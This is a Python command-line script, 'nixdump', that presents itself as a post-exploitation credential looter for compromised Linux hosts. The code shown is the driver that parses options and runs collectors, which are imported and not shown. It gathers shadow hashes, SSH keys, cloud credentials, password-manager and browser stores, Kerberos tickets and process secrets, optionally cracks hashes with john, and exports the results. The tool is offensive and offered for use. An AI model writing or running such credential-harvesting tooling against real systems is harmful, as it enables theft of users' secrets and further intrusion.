#!/usr/bin/env python3
"""nixdump - local Linux credential looter.

Run it on a host you have popped (ideally as root) and it dumps every credential
it can find - shadow hashes (optional offline crack), SSH keys, cloud/CLI creds,
KeePass/Firefox, web-app + DB configs, NetworkManager WiFi/VPN, SSSD cached
domain hashes, Kerberos tickets, and secrets in running processes - into one
unified table.

  ./nixdump.py                 # loot everything readable
  ./nixdump.py --crack         # also crack shadow/kdbx/ssh with john+rockyou
  ./nixdump.py --json --csv -o loot
  ./nixdump.py --only shadow,ssh,cloud
  ./nixdump.py --home-only     # skip full-FS walks (faster/quieter)

Not root? It still runs - root-only collectors (shadow, sssd, networkmanager,
other users' /proc) are skipped automatically.
"""
from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import reporter                                     # noqa: E402
from core.secret import Secret                                # noqa: E402
from core.tools import is_root, which                         # noqa: E402
from core.cracker import default_wordlist                     # noqa: E402
from collectors import ALL_COLLECTORS                          # noqa: E402


def build_args() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="nixdump - local Linux credential looter",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("-o", "--out", default="nixdump_loot",
                   help="output directory for exports")
    p.add_argument("--json", action="store_true", help="export loot.json")
    p.add_argument("--csv", action="store_true", help="export loot.csv")
    p.add_argument("--crack", action="store_true",
                   help="offline-crack shadow/kdbx/ssh hashes with john + wordlist")
    p.add_argument("--wordlist", help="wordlist for --crack (default: rockyou if found)")
    p.add_argument("--home-only", action="store_true",
                   help="only read user homes (skip slow full-filesystem walks)")
    p.add_argument("--only", help="comma list of collectors to run (see --list)")
    p.add_argument("--skip", help="comma list of collectors to skip")
    p.add_argument("--list", action="store_true", help="list collectors and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def select(only, skip):
    chosen = list(ALL_COLLECTORS)
    if only:
        keys = {k.strip().lower() for k in only.split(",")}
        chosen = [c for c in chosen if c.name.lower() in keys]
    if skip:
        keys = {k.strip().lower() for k in skip.split(",")}
        chosen = [c for c in chosen if c.name.lower() not in keys]
    return chosen


def main() -> int:
    args = build_args().parse_args()
    reporter.print_banner()

    if args.list:
        print("Collectors (key -> description):")
        for c in ALL_COLLECTORS:
            root = " [root]" if c.needs_root else ""
            print(f"  {c.name.lower():<12} {c.description}{root}")
        return 0

    root = is_root()
    print(f"[*] euid: {'root' if root else 'non-root (root-only collectors skipped)'}",
          file=sys.stderr)
    if args.crack:
        wl = args.wordlist or default_wordlist()
        if not which("john"):
            print("[!] --crack set but 'john' not found; hashes will be dumped uncracked",
                  file=sys.stderr)
        elif not wl:
            print("[!] --crack set but no wordlist found; pass --wordlist",
                  file=sys.stderr)
        else:
            print(f"[*] crack enabled (john + {wl})", file=sys.stderr)

    opts = {"crack": args.crack, "wordlist": args.wordlist,
            "home_only": args.home_only, "verbose": args.verbose}

    collectors = select(args.only, args.skip)
    results = []
    seen = set()
    for Col in collectors:
        if Col.needs_root and not root:
            print(f"   {Col.name:<12} skipped (needs root)", file=sys.stderr)
            continue
        try:
            got = Col(opts).collect()
        except Exception as e:
            print(f"   {Col.name:<12} error: {e}", file=sys.stderr)
            continue
        added = 0
        for s in got:
            if s.key() in seen:
                continue
            seen.add(s.key())
            results.append(s)
            added += 1
        print(f"   {Col.name:<12} {added:>3} finding(s)", file=sys.stderr)

    print()
    reporter.render_table(results)
    if args.json or args.csv:
        reporter.export(results, args.out, args.json, args.csv)
        print(f"\n[*] exports written under {args.out}/", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
